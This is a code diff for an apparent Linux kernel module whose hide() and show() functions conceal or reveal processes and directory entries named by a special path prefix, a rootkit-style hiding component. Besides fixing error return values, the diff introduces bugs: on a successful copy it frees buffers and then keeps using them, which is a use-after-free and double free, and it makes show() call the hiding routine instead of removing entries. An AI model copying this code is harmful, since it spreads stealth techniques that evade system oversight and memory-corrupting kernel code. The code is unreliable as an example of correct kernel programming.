@@ -22,30 +22,32 @@ int hide(const char __user *path) {
   char* tempPath;
   
   if (path == NULL)
-    return EFAULT;
+    return -EFAULT;
   _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
-  printk("here\n");
   if (IS_ERR_OR_NULL(_path))
-    return ENOMEM;
+    return -ENOMEM;
   result = strncpy_from_user(_path, path, PATH_MAX);
-  printk("here\n");
-  if (result) {
-  printk("%d\n", result);
+  if (result < 0) {
     kfree(_path);
-    return result < 0 ? -result : result;
+    return result;
   }
-  printk("here\n");
   tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
     kfree(_path);
-    return ENOMEM;
+    return -ENOMEM;
   }
-  strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
+  result = strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
+  if (result) {
+    kfree(_path);
+    kfree(tempPath);
+  }
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
   kfree(_path);
-  if(result == -ENOMEM)
-    return ENOMEM;
+  if(result == -ENOMEM) {
+    kfree(tempPath);
+    return -ENOMEM;
+  }
   return 0;
 }
 
@@ -138,33 +140,37 @@ int hide_init(struct sctm *sctm) {
 
 /* show a directory entry */
 int show(const char __user *path) {
-    char *_path;
+  char *_path;
   int result;
   char* tempPath;
   
   if (path == NULL)
-    return EFAULT;
+    return -EFAULT;
   _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
-
   if (IS_ERR_OR_NULL(_path))
-    return ENOMEM;
-  result = strncpy_from_user(_path, path, sizeof(_path));
-  
-  if (result) {
+    return -ENOMEM;
+  result = strncpy_from_user(_path, path, PATH_MAX);
+  if (result < 0) {
     kfree(_path);
-    return result < 0 ? -result : result;
+    return result;
   }
   tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
     kfree(_path);
-    return ENOMEM;
+    return -ENOMEM;
   }
-  strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
+  result = strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
+  if (result) {
+    kfree(_path);
+    kfree(tempPath);
+  }
   //      printk("%s",tempPath);
-  result = deleteProcessToHide(tempPath);
+  result = addProcessToHide(tempPath);
   kfree(_path);
-  if(result == -ENOMEM)
-    return ENOMEM;
+  if(result == -ENOMEM) {
+    kfree(tempPath);
+    return -ENOMEM;
+  }
   return 0;
 }
 
